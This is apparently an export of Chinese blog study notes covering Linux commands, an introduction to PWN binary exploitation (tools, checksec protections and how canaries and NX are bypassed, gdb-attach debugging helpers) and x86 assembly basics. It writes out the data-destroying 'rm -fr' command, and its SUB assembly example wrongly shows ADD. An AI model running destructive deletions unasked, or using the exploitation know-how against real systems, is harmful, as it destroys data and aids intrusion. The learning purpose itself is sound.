##建立单目录<br>mkdir -p   ##建立多层目录</p><p>eg：mkdir -p 123/456/789   在Desktop中创建123文件夹，在123中创建456文件夹，在456中创建789文件夹</p><p>实现了文件夹的多级目录创建</p><p><img src="https://img-blog.csdn.net/20180807123521110?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxOTIzNzcx/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><h3><span id="3文件夹的删除">3：文件夹的删除</span></h3><p>rm file           删除file文件夹，但是会提示是否删除，选择yes或者no</p><p>rm  -f file      强行删除文件不提示<br>rm  -fr file    删除当前目录下的所有文件,这个命令很危险，应避免使用。<br>                     所删除的文件，一般都不能恢复！</p><p><img src="https://img-blog.csdn.net/20180807123902711?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxOTIzNzcx/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><h3><span id="4文件的编辑">4:文件的编辑</span></h3><p><strong>step1</strong>:  vim file        进入file文件编译</p><p><img src="https://img-blog.csdn.net/20180807124020324?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxOTIzNzcx/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p><strong>step2</strong>: 进入文件后输入&lt; I &gt;进入文件输入模式，可以向文件中输入内容</p><p><img src="https://img-blog.csdn.net/20180807124144112?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxOTIzNzcx/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p><strong>step3</strong>：退出编译模式</p><p>按<esc>退出插入编译模式，进入浏览模式</esc></p><p><strong>step4</strong>：文件的退出</p><p>在浏览模式下输入：</p><p>:q      ##当文件没有做任何修改是可用<br>:q!     ##当文件修改但不行保存修改时可用<br>:wq   ##退出保存（一般用这个）<br>:wq!  ##当文件属于自己或用户为root时可用</p><h3><span id="5文件查看">5.文件查看</span></h3><p>文件查看常用指令</p><p>cat file             输出文件的所有内容</p><p><img src="/images/Linux1.png" alt="Linux1"></p><p><img src="/images/Linux2.png" alt="Linux2"></p><h3><span id="6文件路径">6.文件路径</span></h3><p><strong>相对路径</strong>：（则必须有前提条件，其实在系统底层依然是绝对路径执行，只是用户看到的简略移动）</p><p>   文件相对当前系统位置的一个名称简写<br>   文件名称省略了当前路径的值<br>   只有当前在此目录中时可以使用<br>   文件名称不以/开头<br>   文件名称会自动在字符前加入’pwd’显示的路径</p><p><strong>绝对路径</strong>：</p><p> 是文件在系统中真实的位置<br> 任何时间都可以精确表示一个文件的名称<br> 文件名称以/开头</p><p>pwd           显示当前工作目录<br> cd              切换当前工作目录<br> cd /mnt    切换到/mnt目录中<br> cd -           进入当前目录之前所在目录中</p><p> ls               查看文件夹里的所有文件</p><p><strong>绝对路径和相对路径补充</strong>：</p><p><img src="/images/Linux3.png" alt="Linux3"></p><h2><span id="5常用指令合集">5.常用指令合集</span></h2><p>标准格式：命令名称  [命令参数]  [命令对象]</p><p> ls              列出文件信息</p><p> cd            切换工作目录</p><p>pwd         显示当前目录</p><p>cp             复制</p><p>rm            删除</p><p>nc             建立TCP/UDP链接并监听</p><p>su             切换到超级用户</p><p>touch       创建文件</p><p>mkdir       创建目录</p><hr><h1><span id="linuxamppwn">Linux&amp;PWN</span></h1><h2><span id="pwn是什么">PWN是什么</span></h2><p>在安全领域中指的是通过二进制/系统调用等方式获得目标主机的shell</p><h2><span id="0x01-linux下的pwn常用到的工具">0x01 Linux下的pwn常用到的工具：</span></h2><p> （1）gdb：Linux调试中必要用到的<br> （2）gdb-peda：gdb方便调试的工具，类似的工具有gef，gdbinit，这些工具的安装可以参考：<a href="http://blog.csdn.net/gatieme/article/details/63254211">http://blog.csdn.net/gatieme/article/details/63254211</a><br> （3）pwntools:写exp和poc的利器<br> （4）checksec：可以很方便的知道elf程序的安全性和程序的运行平台<br> （5）objdump和readelf：可以很快的知道elf程序中的关键信息<br> （6）ida pro ：强大的反编译工具<br> （7）ROPgadget：强大的rop利用工具<br> （8）one_gadget：可以快速的寻找libc中的调用exec(‘bin/sh’)的位置<br> （9）libc-database： 可以通过泄露的libc的某个函数地址查出远程系统是用的哪个libc版本 </p><h2><span id="0x02-检测elf的安全性">0x02 检测elf的安全性</span></h2><p>拿到efl，首先要用checksec来检测elf运行于哪个平台，开启了什么安全措施，如果用gcc的编译后，默认会开启所有的安全措施。 </p><p> 【1】RELRO：RELRO会有Partial RELRO和FULL RELRO，如果开启FULL RELRO，意味着我们<strong>无法修改got表</strong><br> 【2】Stack：如果栈中开启Canary found，那么就<strong>不能用直接用溢出的方法覆盖栈中返回地址</strong>，而且要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过<br> 【3】NX：NX enabled如果这个保护开启就是意味着<strong>栈中数据没有执行权限</strong>，以前的经常用的call esp或者jmp esp的方法就不能使用，但是可以利用rop这种方法绕过<br> 【4】PIE：PIE enabled如果程序开启这个地址随机化选项就意味着<strong>程序每次运行的时候地址都会变化</strong>，而如果没有开PIE的话那么No PIE (0x400000)，括号内的数据就是程序的基地址 </p><p> 【5】 Arch: 查看操作数</p><p><img src="/images/Linux4.png" alt="Linux4"></p><h2><span id="0x03-调试技巧">0x03 调试技巧</span></h2><p>gdb常用的调试指令：<br> n： 执行一行源代码但不进入函数内部<br> <strong>ni: 执行一行汇编代码但不进入函数内部</strong><br> s： 执行一行源代码而且进入函数内部<br> <strong>si: 执行一行汇编代码而且进入函数内部</strong><br> c: 继续执行到下一个断点<br> *<em>b <em>地址: 下断点</em></em><br> directory+源码所在目录：加载程序源码<br> set follow-fork-mode parent ：只调试主进程<br> stack: 显示栈信息<br> x ： 按十六进制格式显示内存数据，其中x/{字节数}x 以16进制显示指定地址处的数据;{字节数}表示字节数制定（b 单字节；h 双字节；w 四字节；g 八字节；默认为四字节） 【x/40wx表示查看40个地址中的内存数据】</p><p>代码实现：</p><p>程序没有开启地址随机化：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def debug(addr):</span><br><span class="line">    raw_input(&#39;debug:&#39;)</span><br><span class="line">    gdb.attach(r, &quot;b *&quot; + addr)</span><br></pre></td></tr></table></figure><p>在程序运行时调用这个函数就可以调试了 </p><p><img src="/images/Linux5.png" alt="Linux5"></p><p>程序开启地址随机化：(看不懂。。)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">wordSz &#x3D; 4</span><br><span class="line">hwordSz &#x3D; 2</span><br><span class="line">bits &#x3D; 32</span><br><span class="line">PIE &#x3D; 0</span><br><span class="line">mypid&#x3D;0</span><br><span class="line">def leak(address, size):</span><br><span class="line">   with open(&#39;&#x2F;proc&#x2F;%s&#x2F;mem&#39; % mypid) as mem:</span><br><span class="line">      mem.seek(address)</span><br><span class="line">      return mem.read(size)</span><br><span class="line"></span><br><span class="line">def findModuleBase(pid, mem):</span><br><span class="line">   name &#x3D; os.readlink(&#39;&#x2F;proc&#x2F;%s&#x2F;exe&#39; % pid)</span><br><span class="line">   with open(&#39;&#x2F;proc&#x2F;%s&#x2F;maps&#39; % pid) as maps:</span><br><span class="line">      for line in maps:</span><br><span class="line">         if name in line:</span><br><span class="line">            addr &#x3D; int(line.split(&#39;-&#39;)[0], 16)</span><br><span class="line">            mem.seek(addr)</span><br><span class="line">            if mem.read(4) &#x3D;&#x3D; &quot;\x7fELF&quot;:</span><br><span class="line">               bitFormat &#x3D; u8(leak(addr + 4, 1))</span><br><span class="line">               if bitFormat &#x3D;&#x3D; 2:</span><br><span class="line">                  global wordSz</span><br><span class="line">                  global hwordSz</span><br><span class="line">                  global bits</span><br><span class="line">                  wordSz &#x3D; 8</span><br><span class="line">                  hwordSz &#x3D; 4</span><br><span class="line">                  bits &#x3D; 64</span><br><span class="line">               return addr</span><br><span class="line">   log.failure(&quot;Module&#39;s base address not found.&quot;)</span><br><span class="line">   sys.exit(1)</span><br><span class="line"></span><br><span class="line">def debug(addr &#x3D; 0):</span><br><span class="line">    global mypid</span><br><span class="line">    mypid &#x3D; proc.pidof(r)[0]</span><br><span class="line">    raw_input(&#39;debug:&#39;)</span><br><span class="line">    with open(&#39;&#x2F;proc&#x2F;%s&#x2F;mem&#39; % mypid) as mem:</span><br><span class="line">        moduleBase &#x3D; findModuleBase(mypid, mem)</span><br><span class="line">        gdb.attach(r, &quot;set follow-fork-mode parent\nb *&quot; + hex(moduleBase+addr))</span><br></pre></td></tr></table></figure><p>由于开启地址随机化之后ida pro打开程序后，显示的是程序的偏移地址，而不是实际的地址，当程序加载后程序的程序的实际地址是：基地址+偏移地址，调用debug函数的时候只要把偏移地址传递进去就好</p>]]></content>
      
      
      <categories>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编基础总结</title>
      <link href="/2021/01/21/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/"/>
      <url>/2021/01/21/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<hr><h1><span id="cpu架构与指令集">CPU架构与指令集</span></h1><p><strong>CPU</strong>：从内存中读取指令，再解码和执行</p><p><strong>指令集</strong>：操作码+特定CPU执行的基本命令；一堆二进制数据；分为CISC与RISC两种</p><p><strong>汇编、指令集之间的关系</strong>：</p><p>​    二进制数据不利于阅读与理解，于是汇编语言诞生，每条汇编指令都有对应的指令</p><h2><span id="cisc与risc对比">CISC与RISC对比</span></h2><p><strong>CISC（x86）</strong>  ：指令长度不固定（1~6字节【32位】）；指令数量相对更多（说白了更讲究）；寻址方式多样；                            通用寄存器更少；</p><p>​                            缺点：反编译会指令错位；</p><p><strong>RISC（ARM）</strong>：指令长度固定（4字节【32位】）；指令数量相对较少需要组合（没那么讲究）；寻址方式单                            一；通用寄存器更多；</p><p>​                            优点：有利于解码和优化，可以实现流水线；</p><p>​                            缺点：平均代码更长，占空间</p><hr><h1><span id="x86x64-汇编基础">x86/x64 汇编基础</span></h1><h2><span id="cpu操作模式">CPU操作模式</span></h2><p><strong>保护模式</strong>：类似虚拟机；所有指令和特性都可用，但只能在分配的内存段使用</p><p><strong>实地址模式</strong>：直接访问硬件及其实际内存地址（类似于直接在cmd里操作。。。。吧？？）</p><p><strong>系统管理模式</strong>：提供电源管理或安全保护特性机制（更个性化？？）</p><h2><span id="语法风格">语法风格</span></h2><p>x86：AT&amp;T风格和Intel风格</p><h2><span id="寄存器与数据类型">寄存器与数据类型</span></h2><h2><span id="寄存器">寄存器</span></h2><table><thead><tr><th>操作数</th><th>可用寄存器名称</th></tr></thead><tbody><tr><td>32位</td><td>EAX、EBX、ECX、EDX、EDI、ESI、EBP、ESP、R8D~R15D</td></tr><tr><td>64位</td><td>RAX、RBX、RCX、RDX、RDI、RSI、RBP、RSP、R8~R15</td></tr></tbody></table><p>注意：64位模式下，操作数还是默认位32位，有8个通用寄存器；当给指令加上REX（寄存器扩展）前缀后，操作数才变为64位，添加8个带标号的通用寄存器（R8~R15）</p><p>64位处理器特点：</p><ol><li>64位与32位有相同的标志位状态；</li><li>64位模式下不能访问通用寄存器的高位字节（如AH、BH、CH、DH）;</li></ol><h2><span id="数据类型">数据类型</span></h2><ul><li><p>整数：1234这种要有后缀表明是什么进制的数；</p><p>​            ABCD这种十六进制要在以字母开头的十六进制数前加0表示，如0ABCDh；</p></li><li><p>浮点数：以十进制表示；以十六进制编码</p></li><li><p>字符串常量：允许字符串常量的嵌套（如 ‘he says “hello”‘）;在内存中以整数字节序列保存</p></li></ul><h2><span id="数据传送与访问">数据传送与访问</span></h2><p><strong>MOV指令</strong>：MOV  EAX,ECX  表示将ECX寄存器的值拷贝进EAX (第一个参数为目的操作数，第二个参数为源操作数)</p><p>​    如果出现小操作数（32）扩展为大操作数（64）的情况，需要对操作数进行全零扩展或符号扩展</p><p><strong>XCHG指令</strong>：交换两个操作数的值（操作数数据类型要相同）</p><p>变量名+偏移量可表示一个直接偏移量操作数（管他有没有看懂概念看例子就完事儿）</p><p>如下表示一个数组</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">testArray BYTE 99h,98h,97h,96h</span><br><span class="line">.code</span><br><span class="line">MOV al, testArray             ; al&#x3D;99h</span><br><span class="line">MOV bl, [testArray+1]         ; bl&#x3D;98h</span><br><span class="line">MOV cl, [testArray+2]         ; cl&#x3D;97h</span><br></pre></td></tr></table></figure><h2><span id="算术运算与逻辑运算">算术运算与逻辑运算</span></h2><p><strong>补码</strong>：计算机底层数据都是以补码形式表示；</p><p>​            两机器数相加的补码=先求补码再相加；</p><p>​            加法运算可将符号位和数值为一起算（符号位有进位则直接舍弃）；</p><p>​            减法运算利用其相反数的加法实现；</p><p><strong>INC指令</strong>：操作数+1</p><p><strong>DEC指令</strong>：操作数-1</p><p><strong>ADD指令</strong>：将长度相同的操作数进行相加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">testData DWORD 10000h</span><br><span class="line">testData2 DWORD 20000h</span><br><span class="line">.code</span><br><span class="line">MOV EAX,testData   ; EAX&#x3D;10000h</span><br><span class="line">ADD EAX,testData2  ; EAX&#x3D;30000h</span><br></pre></td></tr></table></figure><p><strong>SUB指令</strong>：从目的操作数中减去源操作数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">testData DWORD 20000h</span><br><span class="line">testData2 DWORD 10000h</span><br><span class="line">.code</span><br><span class="line">MOV EAX,testData   ; EAX&#x3D;20000h</span><br><span class="line">ADD EAX,testData2  ; EAX&#x3D;10000h</span><br></pre></td></tr></table></figure><p><strong>NEG指令</strong>：将操作数转换为二进制补码，并将符号位取反</p><h2><span id="跳转指令与循环指令">跳转指令与循环指令</span></h2><p>跳转指令类型：条件跳转和无条件跳转</p><p><strong>JMP指令</strong>：无条件跳转；需要用标号来标识，汇编时会将标号转换位相应的偏移量；标号和 JMP指令要再同一函                  数中，但全局标号不受限制。（和goto语句有点像）</p><p>​                下面程序先给EAX赋值再给EBX赋值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">JMP labell</span><br><span class="line">MOV EBX, 0</span><br><span class="line">labell:</span><br><span class="line">MOV EAX, 0</span><br></pre></td></tr></table></figure><p>​                当在循环结束时用JMP指令跳回循环开始位置可实现无限循环</p><p><strong>LOOP指令</strong>：创建一个循环代码块</p><p>​                     ECX寄存器为循环的计数器，循环一次，ECX值-1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MOV AX, 0</span><br><span class="line">MOV ECX, 3</span><br><span class="line">L1:</span><br><span class="line">INC AX</span><br><span class="line">LOOP L1</span><br><span class="line">XOR EAX, EBX</span><br></pre></td></tr></table></figure><p>​    LOOP指令分为两步：第一步将ECX -1；第二步将ECX与0比较，如果ECX不为0，跳转到标号地址处（INC                 AX）；如果ECX为0，则不跳转，执行LOOP下一条指令（XOR   EAX，EBX）</p><p>​    如果ECX的初始值为0，那么执行LOOP指令时，ECX -1变为FFFFFFFFh，是个很大的循环，因此在编写x86汇编语言时一般情况不需要显式地改变ECX的值，特别是存在循环嵌套的情况时。（不懂。。）</p><h2><span id="栈与函数调用">栈与函数调用</span></h2><p><strong>栈</strong>：特点：先入后出（可以想象成一个薯片桶）</p><pre><code>   用途：存储局部变量；执行CALL指令调用函数时，保存函数地址以便函数结束时正确返回；传递函数参数</code></pre><p>​       常用指令：</p><p>​            PUSH指令：入栈；对ESP/RSP/SP寄存器的值减去 4（32位）或 8（64位），将操作数写入寄存器中指针                                指向的内存中</p><p>​            POP指令  ：出栈；是PUSH指令的逆操作；先从ESP等寄存器指向的内存中读取数据写入其他内存地址或                                寄存器，再将寄存器的值加上 4（32位）或 8（64位）</p><p>​        <strong>（说白了：PUSH  AX 表示将寄存器AX中的数据送入栈中；POP AX 表示从栈顶取出数据送入AX）</strong></p><p>下方代码通过栈实现EAX与EBX值的交换</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MOV EAX, 1234h</span><br><span class="line">   MOV EBX, 5678h</span><br><span class="line">   PUSH EAX</span><br><span class="line">   PUSH EBX</span><br><span class="line">   POP EAX</span><br><span class="line">   POP EBX</span><br></pre></td></tr></table></figure><h3><span id="使用栈保存函数保存地址">使用栈保存函数保存地址</span></h3><p><strong>CALL指令</strong>：调用子函数；调用时，CALL指令的下一条指令地址将作为返回地址被保存在栈中，当调用函数结束                时，执行RET指令跳转到返回地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">....code</span><br><span class="line">...main PROC</span><br><span class="line">0x00008000  MOV EBX, EAX</span><br><span class="line">......</span><br><span class="line">0X00008020  CALL testFunc</span><br><span class="line">0x00008025  MOV EAX, EBX</span><br><span class="line">......</span><br><span class="line">...main ENDP</span><br><span class="line">......</span><br><span class="line">0x00008A00  testFunc PROC</span><br><span class="line">...MOV EAX, EDX</span><br><span class="line">......</span><br><span class="line">...RET</span><br><span class="line">...textFunc ENDP</span><br></pre></td></tr></table></figure><p>注：proc是定义子程序的伪指令，位置在子程序的开始处，它和endp分别表示子程序定义的开始和结束两者必须成对出现。</p><p>当CALL指令执行时，下一条指令地址（0x00008025）被压入栈中，被调用函数testFunc地址0x00008A00被加载进EIP寄存器（EIP寄存器存放  下一个CPU指令存放的内存地址）</p><p>   执行RET指令时，ESP指向的数据弹出至EIP；ESP数值增加指向栈中上一个值</p><h3><span id="使用栈传递函数参数">使用栈传递函数参数</span></h3><p>cdecl约定：</p><p>​            假设函数 func 有三个参数 agr1、agr2、agr3 ，在cdecl约定下通常为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push arg3</span><br><span class="line">push arg2</span><br><span class="line">push arg1</span><br><span class="line">call func</span><br></pre></td></tr></table></figure><p>（只知道这么多了。。。）</p><h3><span id="使用栈存储变量">使用栈存储变量</span></h3><p>涉及到了PUSHFD和POPFD，但讲的很少就没怎么看懂</p>]]></content>
      
      
      <categories>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
